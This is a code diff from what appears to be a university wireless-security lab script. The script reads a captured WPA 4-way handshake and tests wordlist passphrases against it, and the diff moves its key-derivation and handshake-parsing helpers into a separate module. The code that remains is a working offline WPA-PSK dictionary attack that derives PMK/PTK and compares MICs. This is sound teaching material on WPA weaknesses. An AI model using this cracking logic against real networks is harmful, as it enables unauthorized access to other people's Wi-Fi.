@@ -16,73 +16,13 @@ __version__ = "1.0"
 __email__ = "abraham.rubinstein@heig-vd.ch"
 __status__ = "Prototype"
 
-from scapy.all import *
-from binascii import a2b_hex, b2a_hex
-from scapy.contrib.wpa_eapol import WPA_key
-from scapy.layers.dot11 import *
-from scapy.layers.eap import *
-
-from pbkdf2 import *
-from numpy import array_split
-from numpy import array
-import hmac, hashlib
-
-
-def customPRF512(key, A, B):
-    """
-    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
-    """
-    blen = 64
-    i = 0
-    R = b''
-    while i <= ((blen * 8 + 159) / 160):
-        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
-        i += 1
-        R = R + hmacsha1.digest()
-    return R[:blen]
-
-
-def getAssociationRequestInfo(packets):
-    assocRequests = list(filter(lambda pkt: pkt.haslayer(Dot11AssoReq), packets))
-    if len(assocRequests) == 0:
-        raise Exception("Cannot find association request")
-
-    # Retrieve info from the first association request
-    pkt = assocRequests[0]
-    ssid = pkt.info.decode('ascii')
-    APmac = a2b_hex(pkt.addr1.replace(':', ''))
-    Clientmac = a2b_hex(pkt.addr2.replace(':', ''))
-    return ssid, APmac, Clientmac
-
-
-# Handshake packets must be in order
-def getHandshakeInfo(packets):
-    pkts = list(filter(lambda pkt: pkt.haslayer(WPA_key), packets))
-    if len(pkts) != 4:
-        raise Exception("Invalid handshake")
-
-    handshakePkts = list(map(lambda pkt: pkt.getlayer(WPA_key), pkts))
-
-    # Authenticator and Supplicant Nonces
-    ANonce = handshakePkts[0].nonce  # ANonce in first message of the handshake
-    SNonce = handshakePkts[1].nonce  # SNonce in second message of the handshake
-
-    # This is the MIC contained in the 4th frame of the 4-way handshake
-    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary
-    mic = handshakePkts[3].wpa_key_mic  # mic in fourth message of the handshake
-
-    handshakePkts[3].wpa_key_mic = 0  # Zero the mic key to remove the value from the data
-    data = bytes(handshakePkts[3].underlayer)
-
-    return ANonce, SNonce, mic, data
-
+from wpa_key_derivation import *
 
 # Read capture file -- it contains beacon, authentication, associacion, handshake and data
 wpa = rdpcap("wpa_handshake.cap")
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
 A = "Pairwise key expansion"  # this string is used in the pseudo-random function
-
 ssid, APmac, Clientmac = getAssociationRequestInfo(wpa)
 ANonce, SNonce, mic_to_test, data = getHandshakeInfo(wpa)
 
@@ -96,10 +36,7 @@ print("CLient Mac: ", b2a_hex(Clientmac), "\n")
 print("AP Nonce: ", b2a_hex(ANonce), "\n")
 print("Client Nonce: ", b2a_hex(SNonce), "\n")
 
-passPhrase = "actuelle"
-print("Passphrase: ", passPhrase, "\n")
-
-f = open('./wordlist.txt')
+f = open('./wordlist.txt', 'r')
 for passPhrase in f.read().splitlines():
     # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
     passPhrase = str.encode(passPhrase)
@@ -124,4 +61,3 @@ for passPhrase in f.read().splitlines():
         print("MICK:\t\t", ptk[48:64].hex(), "\n")
         print("MIC:\t\t", mic.hexdigest(), "\n")
         break
-print('Done')
